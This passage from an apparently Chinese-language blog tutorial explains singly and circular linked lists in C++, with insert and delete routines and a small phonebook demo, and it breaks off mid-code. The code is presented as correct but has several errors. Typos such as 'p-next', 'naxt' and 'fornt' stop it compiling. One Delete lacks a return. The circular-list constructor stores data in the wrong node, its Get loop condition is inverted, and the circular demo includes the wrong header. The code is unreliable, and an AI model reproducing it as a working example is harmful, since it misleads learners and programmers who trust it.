<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">Insertup</span>(T *p,T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *s=<span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    s-&gt;data=p-&gt;data;</span><br><span class="line">    s-&gt;next=p-&gt;next;</span><br><span class="line">    p-&gt;next=s;</span><br><span class="line">    p-&gt;data=x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="删除操作-1">删除操作</h4>
<p>​ 操作过程可分为5个步骤：</p>
<ol type="1">
<li>从第一个结点开始，查找第i-1个结点，设为p指向该结点；</li>
<li>设q指向第i个元素；</li>
<li>摘链，即将q元素从链表中摘除；</li>
<li>保存q元素的数据；</li>
<li>释放q元素；</li>
</ol>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230305230950316.png" /></p>
<p>​ 下面给出代码实现:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T LinkList&lt;T&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p=front;</span><br><span class="line">    <span class="keyword">if</span>(i!=<span class="number">1</span>)p=<span class="built_in">Get</span>(i<span class="number">-1</span>);<span class="comment">//若不是在第一个位置删除，得到第i-1个个元素的地址</span></span><br><span class="line">    Node&lt;T&gt; *q=p-&gt;next;</span><br><span class="line">    p-next=q-&gt;next;</span><br><span class="line">    T x=q-&gt;data;</span><br><span class="line">    <span class="keyword">delete</span> q;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 如果要删除单链表中p所指的某个结点：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T LinkList&lt;T&gt;::<span class="built_in">Delete</span>(T *p)</span><br><span class="line">&#123;</span><br><span class="line">    T x=p-&gt;data;</span><br><span class="line">    Node&lt;T&gt; *q=p-&gt;next;</span><br><span class="line">    p-&gt;data=q-&gt;data;</span><br><span class="line">    p-&gt;next=q-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="单链表的应用通信录">单链表的应用——通信录</h2>
<p>​ 下面给出实现代码</p>
<p>​ LinkList.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    T data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&lt;T&gt; *next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkList</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        Node&lt;T&gt; *front;</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">LinkList</span>() &#123; front = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">            front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            length = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">LinkList</span>(T a[], <span class="type">int</span> n);</span><br><span class="line">        ~<span class="built_in">LinkList</span>();</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">GetLength</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">Node&lt;T&gt; * <span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(T x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, T x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Insertbh</span><span class="params">(Node&lt;T&gt; *p,T x)</span></span>;</span><br><span class="line">        <span class="function">T <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//前插法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">template&lt;class T&gt;</span></span><br><span class="line"><span class="comment">LinkList&lt;T&gt;::LinkList(T a[],int n)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    front = new Node&lt;T&gt;;</span></span><br><span class="line"><span class="comment">    front-&gt;next = NULL;</span></span><br><span class="line"><span class="comment">    for (int i = n - 1; i &gt;= 0;i--)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">         Node&lt;T&gt; *s = new Node&lt;T&gt;;</span></span><br><span class="line"><span class="comment">         s-&gt;data = a[i];</span></span><br><span class="line"><span class="comment">         s-&gt;next = front-&gt;next;</span></span><br><span class="line"><span class="comment">         fornt-&gt;next = s;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    length=n;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 尾插法</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">LinkList&lt;T&gt;::<span class="built_in">LinkList</span>(T a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    front = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    Node&lt;T&gt; *r = front;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s;</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    length = n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">LinkList&lt;T&gt;::~<span class="built_in">LinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        front = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> front;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data.<span class="built_in">print</span>();</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">GetLength</span>()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Node&lt;T&gt; * LinkList&lt;T&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front-&gt;next;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p&amp;&amp;j!=i)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">int</span> LinkList&lt;T&gt;::<span class="built_in">Locate</span>(T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front-&gt;next;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data==x)</span><br><span class="line">            <span class="keyword">return</span> j;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//插入操作</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i, T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">1</span>)</span><br><span class="line">        p = <span class="built_in">Get</span>(i<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = s;</span><br><span class="line">        length++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//前插操作</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> LinkList&lt;T&gt;::<span class="built_in">Insertbh</span>(Node&lt;T&gt; *p,T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    s-&gt;data = p-&gt;data;</span><br><span class="line">    s-&gt;naxt = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    p-&gt;data = x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T LinkList&lt;T&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = front;</span><br><span class="line">    <span class="keyword">if</span>(i!=<span class="number">1</span>)</span><br><span class="line">        p = <span class="built_in">Get</span>(i - <span class="number">1</span>);</span><br><span class="line">    Node&lt;T&gt; *q = p-&gt;next;</span><br><span class="line">    T x = q-&gt;data;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> q;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 删除单链表中p所指的某个结点</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">template &lt;class T&gt;</span></span><br><span class="line"><span class="comment">T LinkList&lt;T&gt;::Delete(T *p)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    T x=p-&gt;data;</span></span><br><span class="line"><span class="comment">    Node&lt;T&gt; *q=p-&gt;next;</span></span><br><span class="line"><span class="comment">    p-&gt;data=q-&gt;data;</span></span><br><span class="line"><span class="comment">    p-&gt;next=q-&gt;next;</span></span><br><span class="line"><span class="comment">    delete q;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>PHONEBOOK.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PHONEBOOK</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_ID;</span><br><span class="line">    std::string m_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>(<span class="type">int</span> id, std::string name)</span><br><span class="line">    &#123;</span><br><span class="line">        m_ID = id;</span><br><span class="line">        m_name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; m_ID &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; m_name &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(PHONEBOOK &amp;p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p.m_ID == m_ID)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ 主程序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PHONEBOOK.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LinkList.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHONEBOOK pbook[<span class="number">2</span>] = &#123;&#123;<span class="number">20181208</span>, <span class="string">&quot;Mary&quot;</span>&#125;, &#123;<span class="number">20181127</span>, <span class="string">&quot;Tom&quot;</span>&#125;&#125;;</span><br><span class="line">    <span class="function">PHONEBOOK <span class="title">record</span><span class="params">(<span class="number">20181209</span>, <span class="string">&quot;Phoenix&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function">LinkList&lt;PHONEBOOK&gt; <span class="title">list</span><span class="params">(pbook, <span class="number">2</span>)</span></span>;</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    list.<span class="built_in">Insert</span>(<span class="number">1</span>, record);</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    PHONEBOOK x = list.<span class="built_in">Delete</span>(<span class="number">3</span>);</span><br><span class="line">    x.<span class="built_in">print</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    list.<span class="built_in">PrintList</span>();</span><br><span class="line">    <span class="type">int</span> p = list.<span class="built_in">Locate</span>(record);</span><br><span class="line">    cout &lt;&lt; p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="循环链表的实现">循环链表的实现</h2>
<p>​ 循环链表即链表首尾相接的链表</p>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230306103212474.png" /></p>
<p>​
带尾指针的单循环链表相对于单链表，只是改用指向终端结点的尾指针，并且尾结点的指针域指向头结点；</p>
<ul>
<li>头指针的表示：单链表使用front标识头指针，单循环链表使用rear-&gt;next标识头指针；</li>
<li>判断p指向的某结点是否为尾结点的方法：单链表中若p-&gt;next=NULL，单循环链表中p==rear；</li>
</ul>
<p>​
带尾结点的单循环链表的C++语言描述(还能实现带头结点的单循环链表，在此不做展开)</p>
<p>​ CLinkList.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    T data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>&lt;T&gt; *next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CLinkList</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;T&gt; *rear;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CLinkList</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        rear = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        rear-&gt;next = rear;</span><br><span class="line">        length = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CLinkList</span>(T a[], <span class="type">int</span> n);</span><br><span class="line">    ~<span class="built_in">CLinkList</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">GetLength</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Node&lt;T&gt; *<span class="title">Get</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Locate</span><span class="params">(T x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insert</span><span class="params">(<span class="type">int</span> i, T x)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Insertbh</span><span class="params">(Node&lt;T&gt; *p, T x)</span></span>;</span><br><span class="line">    <span class="function">T <span class="title">Delete</span><span class="params">(<span class="type">int</span> i)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 头插法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">template &lt;class T&gt;</span></span><br><span class="line"><span class="comment">CLinkList&lt;T&gt;::CLinkList(T a[], int n)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    rear = new Node&lt;T&gt;;</span></span><br><span class="line"><span class="comment">    rear-&gt;next = rear;</span></span><br><span class="line"><span class="comment">    for (int i = n - 1; i &gt;= 0; i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        Node&lt;T&gt; *s = new Node&lt;T&gt;;</span></span><br><span class="line"><span class="comment">        s-&gt;data = a[i];</span></span><br><span class="line"><span class="comment">        s-&gt;next = rear-&gt;next;</span></span><br><span class="line"><span class="comment">        rear-&gt;next = s;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    length = n;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 尾插法</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">CLinkList&lt;T&gt;::<span class="built_in">CLinkList</span>(T a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    rear = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    rear-&gt;next = rear;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        rear-&gt;data = a[i];</span><br><span class="line">        s-&gt;next = rear-&gt;next;</span><br><span class="line">        rear-&gt;next = s;</span><br><span class="line">        rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">    length = n;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">CLinkList&lt;T&gt;::~<span class="built_in">CLinkList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p!=rear)</span><br><span class="line">    &#123;</span><br><span class="line">        rear-&gt;next = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> rear-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> CLinkList&lt;T&gt;::<span class="built_in">PrintList</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != rear)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;data.<span class="built_in">print</span>();</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> CLinkList&lt;T&gt;::<span class="built_in">GetLength</span>()</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">Node&lt;T&gt; *CLinkList&lt;T&gt;::<span class="built_in">Get</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear-&gt;next;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p == rear &amp;&amp; j != i)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">int</span> CLinkList&lt;T&gt;::<span class="built_in">Locate</span>(T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear-&gt;next;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != rear)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data == x)</span><br><span class="line">            <span class="keyword">return</span> j;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 插入操作</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> CLinkList&lt;T&gt;::<span class="built_in">Insert</span>(<span class="type">int</span> i, T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">1</span>)</span><br><span class="line">        p = <span class="built_in">Get</span>(i - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != rear-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        s-&gt;next = p-&gt;next;</span><br><span class="line">        p-&gt;next = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 前插操作</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="type">void</span> CLinkList&lt;T&gt;::<span class="built_in">Insertbh</span>(Node&lt;T&gt; *p, T x)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *s = <span class="keyword">new</span> Node&lt;T&gt;;</span><br><span class="line">    s-&gt;data = p-&gt;data;</span><br><span class="line">    s-&gt;naxt = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    p-&gt;data = x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T CLinkList&lt;T&gt;::<span class="built_in">Delete</span>(<span class="type">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;T&gt; *p = rear-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">1</span>)</span><br><span class="line">        p = <span class="built_in">Get</span>(i - <span class="number">1</span>);</span><br><span class="line">    Node&lt;T&gt; *q = p-&gt;next;</span><br><span class="line">    T x = q-&gt;data;</span><br><span class="line">    p-&gt;next = q-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> q;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 删除单链表中p所指的某个结点</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">template &lt;class T&gt;</span></span><br><span class="line"><span class="comment">T LinkList&lt;T&gt;::Delete(T *p)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    T x=p-&gt;data;</span></span><br><span class="line"><span class="comment">    Node&lt;T&gt; *q=p-&gt;next;</span></span><br><span class="line"><span class="comment">    p-&gt;data=q-&gt;data;</span></span><br><span class="line"><span class="comment">    p-&gt;next=q-&gt;next;</span></span><br><span class="line"><span class="comment">    delete q;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​ PHONEBOOK.h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PHONEBOOK</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_ID;</span><br><span class="line">    std::string m_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">PHONEBOOK</span>(<span class="type">int</span> id, std::string name)</span><br><span class="line">    &#123;</span><br><span class="line">        m_ID = id;</span><br><span class="line">        m_name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; m_ID &lt;&lt; <span class="string">&#x27;\t&#x27;</span> &lt;&lt; m_name &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(PHONEBOOK &amp;p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p.m_ID == m_ID)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ main.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;PHONEBOOK.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;LinkList.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PHONEBOOK pbook[<span class="number">2</span>] = &#123;&#123;<span class="number">20181208</span>, <span class="string">&quot;Mary&quot;</span>&#125;, &#123;<span class="number">20181127</span>, <span class="string">&quot;Tom&quot;</span>&#125;&#125;;</span><br><span class="line">    <span class="function">PHONEBOOK <span 